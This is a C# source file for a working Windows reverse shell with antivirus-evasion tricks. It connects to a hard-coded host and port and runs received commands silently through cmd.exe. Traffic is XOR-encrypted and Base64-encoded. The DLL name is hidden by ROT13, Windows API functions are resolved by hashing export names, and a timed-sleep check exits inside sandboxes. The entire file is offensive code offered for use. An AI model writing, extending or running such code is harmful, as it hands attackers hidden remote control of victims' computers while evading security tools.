using System;
using System.IO;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;

namespace ReverseShell
{
    class Program
    {
        public static string enc13(string input) => Regex.Replace(input, "[a-zA-Z]", new MatchEvaluator(c => ((char)(c.Value[0] + (Char.ToLower(c.Value[0]) >= 'n' ? -13 : 13))).ToString()));

        static string k32 = "xreary32.qyy"; //kernel32.dll
        const int DONT_RESOLVE_DLL_REFERENCES = 0x00000001;
        static IntPtr Hk32 = sdfgsfgssdfd(enc13(k32), IntPtr.Zero, DONT_RESOLVE_DLL_REFERENCES);

        public delegate void deleg();

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr snooze(uint millisecondsTimeout);


        public static void WaitFor()
        {
            var rand = new Random();
            uint randTime = (uint)rand.Next(10000, 20000);
            double decide = randTime / 1000 - 0.5;
            DateTime now = DateTime.Now;

            IntPtr procaddr = getAddByHash(enc13(k32), "38112", Hk32);
            snooze Snooze = (snooze)Marshal.GetDelegateForFunctionPointer(procaddr, typeof(snooze));

            Snooze(randTime);
            if (DateTime.Now.Subtract(now).TotalSeconds < decide)
            {
                System.Environment.Exit(1);
            }
        }

        // Set the IP address and port of your netcat server
        private static string HOST = "192.168.77.131"; // remote host
        private static int PORT = 4444; // remote port 


        public static int loops =0;
        static void loopBugHotFix()
        {
            loops += 1;
            if (loops == 10){ 
                System.Environment.Exit(1);
            }
        }

        public static string Base64Encode(string plainText)
        {
            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
            return System.Convert.ToBase64String(plainTextBytes);
        }

        static bool isAllZero(char[] array, int size)
        {

            for (int i = 0; i < size; i++)
            {
                if (!array[i].Equals('\0'))
                    return false; // return false at the first found

            }
            return true; //all elements checked
        }



        // Set the key for the XOR encryption
        private static byte[] KEY = { 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08 }; // harder key 


        static void Main(string[] args)
        {
            WaitFor();
            try
            {
                // Connect to the netcat server
                TcpClient client = new TcpClient(HOST, PORT);
                Stream stream = client.GetStream();

                // Create a stream reader and writer to read and write data to the stream
                StreamReader reader = new StreamReader(stream);
                StreamWriter writer = new StreamWriter(stream);

                byte[] message = Encoding.ASCII.GetBytes("._. We got a Shell!");

                // quick xoring 
                for (int i = 0; i < message.Length; i++)
                {
                    message[i] = (byte)(message[i] ^ KEY[i % KEY.Length]);
                }

                stream.Write(message, 0, message.Length); // send the HELLO to server 


                while (true)
                {
                    // Receive an encrypted message from the server
                    char[] encrypted_message_chars = new char[1024];
                    int chars_received = reader.Read(encrypted_message_chars, 0, encrypted_message_chars.Length);
                    if (!isAllZero(encrypted_message_chars, encrypted_message_chars.Length))
                    {
                        byte[] encrypted_message = new byte[chars_received];
                        for (int i = 0; i < chars_received; i++)
                        {
                            encrypted_message[i] = (byte)encrypted_message_chars[i];
                        }
                        string data = Decrypt(encrypted_message, KEY);
                        string output = ExecuteCommand(data);

                        byte[] encrypted_response = Encrypt(output, KEY);
                        for (int i = 0; i < encrypted_response.Length; i++)
                        {
                            writer.Write((char)encrypted_response[i]);
                        }
                        writer.Flush();

                    }

                    else
                    {
                        loopBugHotFix();
                    }
                }
            }
            catch (Exception)
            {
                System.Environment.Exit(1);
            }
        }

        // Executes a command and returns the output
        private static string ExecuteCommand(string command)
        {
            // Create a process to execute the command
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.CreateNoWindow = true;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "/C " + command;
            startInfo.RedirectStandardOutput = true;
            startInfo.UseShellExecute = false;
            process.StartInfo = startInfo;
            process.Start();

            // Read the output of the command
            string output = process.StandardOutput.ReadToEnd();
            if (string.IsNullOrEmpty(output))
            {
                output = "Response is empty. The command was not found or threw an exception!";
            }
            output = Base64Encode(output);
            // Return the output
            return output;
        }

        // Encrypts a string using the XOR key and return array of bytes
        private static byte[] Encrypt(string data, byte[] key)
        {
            byte[] message_bytes = Encoding.UTF8.GetBytes(data);

            // XOR the message with the key to get the encrypted message
            byte[] encrypted_message = new byte[message_bytes.Length];
            for (int i = 0; i < message_bytes.Length; i++)
            {
                encrypted_message[i] = (byte)(message_bytes[i] ^ KEY[i % KEY.Length]);
            }

            return encrypted_message;
        }

        // Decrypts a byte array using the XOR key and return string 
        private static string Decrypt(byte[] encrypted_message, byte[] key)
        {
            byte[] decrypted_message = new byte[encrypted_message.Length];
            for (int i = 0; i < encrypted_message.Length; i++)
            {
                decrypted_message[i] = (byte)(encrypted_message[i] ^ KEY[i % KEY.Length]);
            }

            // Convert the decrypted message to a string
            string message = Encoding.UTF8.GetString(decrypted_message);

            return message;

        }


        [DllImport("kernel32.dll", EntryPoint = "LoadLibraryExA")]
        public static extern IntPtr sdfgsfgssdfd(string lpFileName, IntPtr hReservedNull, uint dwFlags);


        public static String Gethashfromstring(string inp)
        {
            long sm = 0;
            foreach (char c in inp)
            {
                sm = sm * 10 + ((int)c % 10);
            }
            return sm.ToString();
        }

        public static IntPtr getAddByHash(string library, String hash, IntPtr handle)
        {

            //Get base address of the module in which our exported function of interest resides (kernel32 in the case of OpenProcess)

            if (handle == IntPtr.Zero)
            {
                handle = sdfgsfgssdfd(library, IntPtr.Zero, 0);
            }
            //  Console.WriteLine("[+] Library Base Address: 0x{0:X}", handle.ToString("X"));


            //Obtain value of e_lfanew
            STRUCTS.IMAGE_DOS_HEADER dosheader = (STRUCTS.IMAGE_DOS_HEADER)Marshal.PtrToStructure(handle, typeof(STRUCTS.IMAGE_DOS_HEADER));

            //Obtain signature
            IntPtr sgn = IntPtr.Add(handle, (int)dosheader.e_lfanew);
            STRUCTS.SIGNATURE sign = (STRUCTS.SIGNATURE)Marshal.PtrToStructure(sgn, typeof(STRUCTS.SIGNATURE));

            //Obtain PE file header
            int si = 4 * sizeof(byte);
            IntPtr file_head = IntPtr.Add(sgn, si);
            STRUCTS.IMAGE_FILE_HEADER fileheader = (STRUCTS.IMAGE_FILE_HEADER)Marshal.PtrToStructure(file_head, typeof(STRUCTS.IMAGE_FILE_HEADER));

            //Obtain address of optional header
            int ti;
            unsafe
            {
                ti = sizeof(STRUCTS.IMAGE_FILE_HEADER);
            }
            IntPtr opt_head = IntPtr.Add(file_head, ti);
            // Console.WriteLine("[+] Address of optional header: 0x{0:X}", opt_head.ToString("X"));
            STRUCTS.IMAGE_OPTIONAL_HEADER64 optheader = (STRUCTS.IMAGE_OPTIONAL_HEADER64)Marshal.PtrToStructure(opt_head, typeof(STRUCTS.IMAGE_OPTIONAL_HEADER64));

            //Obtain address of optional header
            IntPtr export_directory = IntPtr.Add(handle, (int)optheader.ExportTable.VirtualAddress);
            // Console.WriteLine("[+] Export table Address: 0x{0:X}", export_directory.ToString("X"));

            //Obtain address of export directory
            STRUCTS.IMAGE_EXPORT_DIRECTORY export_header = (STRUCTS.IMAGE_EXPORT_DIRECTORY)Marshal.PtrToStructure(export_directory, typeof(STRUCTS.IMAGE_EXPORT_DIRECTORY));
            // Console.WriteLine("[+] RVA of Functions: 0x{0:X}", export_header.AddressOfFunctions);
            // Console.WriteLine("[+] RVA of Names: 0x{0:X}", export_header.AddressOfNames);
            // Console.WriteLine("[+] RVA of NameOrdinals: 0x{0:X}", export_header.AddressOfNameOrdinals);

            int no_of_names = (int)export_header.NumberOfNames;
            //int no_of_functions = (int)export_header.NumberOfFunctions;
            //int base_val = (int)export_header.Base;

            IntPtr address_functions = IntPtr.Add(handle, (int)export_header.AddressOfFunctions);
            IntPtr address_names = IntPtr.Add(handle, (int)export_header.AddressOfNames);
            //IntPtr address_nameordinals = IntPtr.Add(handle, (int)export_header.AddressOfNameOrdinals);

            IntPtr func_exact_address = IntPtr.Zero;
            string functionname = "";

            //Enumerating exported functions from the module
            for (int i = 0; i < no_of_names; i++)
            {
                IntPtr func_name_address = IntPtr.Add(address_names, (sizeof(int)) * i);
                int function_name_rva = Marshal.ReadInt32(func_name_address);
                IntPtr func_name_string = IntPtr.Add(handle, function_name_rva);


                functionname = Marshal.PtrToStringAnsi(func_name_string);
                if (Gethashfromstring(functionname).Equals(hash))
                {
                    Console.WriteLine("[+] Hash resolved to function: {0} using hash {1}", functionname, hash);
                    IntPtr func_address = IntPtr.Add(address_functions, (sizeof(int)) * i);

                    int func_address_rva = Marshal.ReadInt32(func_address);

                    func_exact_address = IntPtr.Add(handle, func_address_rva);
                    //Console.WriteLine("[+] Function RVA: 0x{0:X}", func_address_rva.ToString("X"));
                    break;

                }
            }
            Console.WriteLine("[+] Running " + functionname);
            hash = "";
            return func_exact_address;
        }
    }


    class STRUCTS
    {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [Flags]
        public enum ProcessCreationFlags : uint
        {
            ZERO_FLAG = 0x00000000,
            CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
            CREATE_DEFAULT_ERROR_MODE = 0x04000000,
            CREATE_NEW_CONSOLE = 0x00000010,
            CREATE_NEW_PROCESS_GROUP = 0x00000200,
            CREATE_NO_WINDOW = 0x08000000,
            CREATE_PROTECTED_PROCESS = 0x00040000,
            CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
            CREATE_SEPARATE_WOW_VDM = 0x00001000,
            CREATE_SHARED_WOW_VDM = 0x00001000,
            CREATE_SUSPENDED = 0x00000004,
            CREATE_UNICODE_ENVIRONMENT = 0x00000400,
            DEBUG_ONLY_THIS_PROCESS = 0x00000002,
            DEBUG_PROCESS = 0x00000001,
            DETACHED_PROCESS = 0x00000008,
            EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
            INHERIT_PARENT_AFFINITY = 0x00010000
        }

        public struct IMAGE_DOS_HEADER
        {      // DOS .EXE header
            public UInt16 e_magic;              // Magic number
            public UInt16 e_cblp;               // Bytes on last page of file
            public UInt16 e_cp;                 // Pages in file
            public UInt16 e_crlc;               // Relocations
            public UInt16 e_cparhdr;            // Size of header in paragraphs
            public UInt16 e_minalloc;           // Minimum extra paragraphs needed
            public UInt16 e_maxalloc;           // Maximum extra paragraphs needed
            public UInt16 e_ss;                 // Initial (relative) SS value
            public UInt16 e_sp;                 // Initial SP value
            public UInt16 e_csum;               // Checksum
            public UInt16 e_ip;                 // Initial IP value
            public UInt16 e_cs;                 // Initial (relative) CS value
            public UInt16 e_lfarlc;             // File address of relocation table
            public UInt16 e_ovno;               // Overlay number
            public UInt16 e_res_0;              // Reserved words
            public UInt16 e_res_1;              // Reserved words
            public UInt16 e_res_2;              // Reserved words
            public UInt16 e_res_3;              // Reserved words
            public UInt16 e_oemid;              // OEM identifier (for e_oeminfo)
            public UInt16 e_oeminfo;            // OEM information; e_oemid specific
            public UInt16 e_res2_0;             // Reserved words
            public UInt16 e_res2_1;             // Reserved words
            public UInt16 e_res2_2;             // Reserved words
            public UInt16 e_res2_3;             // Reserved words
            public UInt16 e_res2_4;             // Reserved words
            public UInt16 e_res2_5;             // Reserved words
            public UInt16 e_res2_6;             // Reserved words
            public UInt16 e_res2_7;             // Reserved words
            public UInt16 e_res2_8;             // Reserved words
            public UInt16 e_res2_9;             // Reserved words
            public UInt32 e_lfanew;             // File address of new exe header
        }
        public struct SIGNATURE
        {
            public UInt32 signature;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct IMAGE_FILE_HEADER
        {
            public UInt16 Machine;
            public UInt16 NumberOfSections;
            public UInt32 TimeDateStamp;
            public UInt32 PointerToSymbolTable;
            public UInt32 NumberOfSymbols;
            public UInt16 SizeOfOptionalHeader;
            public UInt16 Characteristics;
        }

        public struct IMAGE_OPTIONAL_HEADER64
        {
            public UInt16 Magic;
            public Byte MajorLinkerVersion;
            public Byte MinorLinkerVersion;
            public UInt32 SizeOfCode;
            public UInt32 SizeOfInitializedData;
            public UInt32 SizeOfUninitializedData;
            public UInt32 AddressOfEntryPoint;
            public UInt32 BaseOfCode;
            public UInt64 ImageBase;
            public UInt32 SectionAlignment;
            public UInt32 FileAlignment;
            public UInt16 MajorOperatingSystemVersion;
            public UInt16 MinorOperatingSystemVersion;
            public UInt16 MajorImageVersion;
            public UInt16 MinorImageVersion;
            public UInt16 MajorSubsystemVersion;
            public UInt16 MinorSubsystemVersion;
            public UInt32 Win32VersionValue;
            public UInt32 SizeOfImage;
            public UInt32 SizeOfHeaders;
            public UInt32 CheckSum;
            public UInt16 Subsystem;
            public UInt16 DllCharacteristics;
            public UInt64 SizeOfStackReserve;
            public UInt64 SizeOfStackCommit;
            public UInt64 SizeOfHeapReserve;
            public UInt64 SizeOfHeapCommit;
            public UInt32 LoaderFlags;
            public UInt32 NumberOfRvaAndSizes;

            public IMAGE_DATA_DIRECTORY ExportTable;
            public IMAGE_DATA_DIRECTORY ImportTable;
            public IMAGE_DATA_DIRECTORY ResourceTable;
            public IMAGE_DATA_DIRECTORY ExceptionTable;
            public IMAGE_DATA_DIRECTORY CertificateTable;
            public IMAGE_DATA_DIRECTORY BaseRelocationTable;
            public IMAGE_DATA_DIRECTORY Debug;
            public IMAGE_DATA_DIRECTORY Architecture;
            public IMAGE_DATA_DIRECTORY GlobalPtr;
            public IMAGE_DATA_DIRECTORY TLSTable;
            public IMAGE_DATA_DIRECTORY LoadConfigTable;
            public IMAGE_DATA_DIRECTORY BoundImport;
            public IMAGE_DATA_DIRECTORY IAT;
            public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
            public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
            public IMAGE_DATA_DIRECTORY Reserved;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_DATA_DIRECTORY
        {
            public UInt32 VirtualAddress;
            public UInt32 Size;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_EXPORT_DIRECTORY
        {
            public UInt32 Characteristics;
            public UInt32 TimeDateStamp;
            public UInt16 MajorVersion;
            public UInt16 MinorVersion;
            public UInt32 Name;
            public UInt32 Base;
            public UInt32 NumberOfFunctions;
            public UInt32 NumberOfNames;
            public UInt32 AddressOfFunctions;     // RVA from base of image
            public UInt32 AddressOfNames;     // RVA from base of image
            public UInt32 AddressOfNameOrdinals;  // RVA from base of image
        }


    }


}
